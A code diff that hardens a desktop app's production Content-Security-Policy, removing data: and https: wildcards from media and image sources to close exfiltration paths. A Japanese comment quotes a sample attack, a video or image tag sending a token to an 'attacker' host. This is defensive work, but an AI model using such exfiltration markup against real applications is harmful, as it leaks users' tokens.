@@ -1599,15 +1599,35 @@ async function startApp(): Promise<void> {
     // 本修正で violation が `/api/csp_report` に POST される (既存 endpoint)。
     const _CSP_REPORT_DIRECTIVE = " report-uri https://app.shuttle-scope.com/api/csp_report;"
 
+    // Round 258 R18 P1 fix (NEW-7/NEW-8): R17 までの CSP は `data:` を default-src
+     // に許し、`media-src` / `img-src` も `https:` ワイルドカードを残していた。
+     // 結果として、renderer XSS が `<video src="https://attacker/exfil?token=...">`
+     // や `<img src="https://attacker/...">` で path-info / Range timing を任意
+     // ドメインに送る covert exfil 経路を CSP 側で塞げていなかった。
+     // (R17 NEW-4 の mirror-broadcast 修正は IPC 経路のみで、renderer 自身の
+     //  CSP までは縛れていなかった盲点。)
+     // 修正:
+     //   - default-src から `data:` を撤去 (`script-src 'self'` の方が強制力強い
+     //     が、defense-in-depth)
+     //   - media-src は `'self' localfile: app: blob:` のみ。video element は
+     //     localfile:/// または app://video/{token} 経由しか使わないので https: は
+     //     不要 (YouTube は frame-src で iframe 経由 → YouTube 側 CSP に従う)。
+     //   - img-src は data: を残す (canvas.toDataURL() を <img> に渡す UI 経路が
+     //     存在するため)。https: は shuttle-scope.com 系の 4 host だけ allow。
+    const _PROD_HTTPS_HOST_LIST =
+      'https://app.shuttle-scope.com ' +
+      'https://www.shuttle-scope.com ' +
+      'https://shuttle-scope.com ' +
+      'https://cdn.shuttle-scope.com'
     const cspParts = isProductionLike
       ? [
-          "default-src 'self' localfile: app: blob: data: http://localhost:*;",
+          "default-src 'self' localfile: app: blob: http://localhost:*;",
           // packaged では Vite/Tailwind の inline は事前ビルド済みで不要。
           " script-src 'self';",
           " style-src 'self' 'unsafe-inline';",  // CSS は inline 残す (Tailwind preflight)
-          " media-src 'self' localfile: app: blob: data: https:;",
+          " media-src 'self' localfile: app: blob:;",
           " frame-src https://www.youtube.com https://www.youtube-nocookie.com;",
-          " img-src 'self' localfile: app: blob: data: https:;",
+          ` img-src 'self' localfile: app: blob: data: ${_PROD_HTTPS_HOST_LIST};`,
           ` connect-src ${_PROD_CONNECT_ALLOWLIST};`,
           _CSP_REPORT_DIRECTIVE,
         ]
